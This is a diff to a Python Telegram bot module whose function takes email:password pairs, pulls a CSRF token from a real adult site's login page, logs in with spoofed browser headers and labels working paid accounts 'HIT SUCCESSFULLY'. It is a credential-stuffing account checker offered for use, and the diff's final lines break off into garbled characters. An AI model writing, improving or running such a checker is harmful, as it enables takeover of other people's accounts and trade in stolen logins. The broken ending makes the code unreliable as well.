@@ -1,6 +1,5 @@
 import requests
 import time
-from urllib.parse import urlparse
 
 def process_bg_command(bot, message):
     chat_id = message.chat.id
@@ -26,56 +25,49 @@ def process_bg_command(bot, message):
 
 def check_bg_account(account):
     email, password = account.split(':')
+    
+    # Initial GET request to fetch CSRF token
+    login_page_url = "https://www.bang.com/login"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+        "Pragma": "no-cache",
+        "Accept": "*/*",
+        "Origin": "https://www.bang.com",
+        "Referer": "https://www.bang.com/login",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin"
+    }
     session = requests.Session()
+    response = session.get(login_page_url, headers=headers)
 
-    # Get CSRF token
-    response = session.get("https://www.bang.com/login_check")
-    token = get_str(response.text, "token: '", "',")
+    if response.status_code != 200:
+        return "Failed to retrieve CSRF token"
 
-    # Attempt login
-    login_data = {
+    token = extract_token(response.text)
+
+    # Login request
+    login_url = "https://www.bang.com/login_check"
+    data = {
         "_username": email,
         "_password": password,
         "_remember_me": "true",
         "_token": token
     }
-    login_headers = {
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
-        "Pragma": "no-cache",
-        "Accept": "*/*",
-        "origin": "https://www.bang.com",
-        "referer": "https://www.bang.com/login",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-origin"
-    }
 
-    response = session.post("https://www.bang.com/login_check", json=login_data, headers=login_headers)
-    
-    if "success\":true" in response.text or "type\\u0022:\\u0022paid" in response.text:
-        account_type = "Paid"
+    response = session.post(login_url, headers=headers, json=data)
+
+    if "success\":true" in response.text and "type\":\"paid\"" in response.text:
+        return "HIT SUCCESSFULLY"
     elif "success\":false" in response.text:
-        return "Incorrect Email OR Password❌"
+        return "Invalid Credentials❌"
     else:
-        account_type = "Free"
+        return f"Unknown Response: {response.text}"
 
-    username = get_str(response.text, "username\\u0022:\\u0022", "\\")
-    stream = get_str(response.text, "stream\\u0022:", ",\\")
-    download = get_str(response.text, "download\\u0022:", ",\\")
-    
-    return (f"HIT SUCCESSFULLY\n"
-            f"Username: {username}\n"
-            f"Account Type: {account_type}\n"
-            f"Stream: {stream}\n"
-            f"Download: {download}")
-
-def get_str(string, start, end):
-    try:
-        str_ = string.split(start)
-        str_ = str_[1].split(end)
-        return str_[0]
-    except IndexError:
-        return ""
+def extract_token(html):
+    start = html.find("token: '") + len("token: '")
+    end = html.find("',", start)
+    return html[start:end]
 
 def get_footer_info(total_accounts, start_time, username):
     elapsed_time = time.time() - start_time
@@ -86,5 +78,4 @@ def get_footer_info(total_accounts, start_time, username):
         f"⌧ Checked by: {username}\n"
         f"⚡️ Bot by - AFTAB [BOSS]\n"
         f"－－－－－－－－－－－－－－－－"
-    )
-    return footer
+   ​⬤
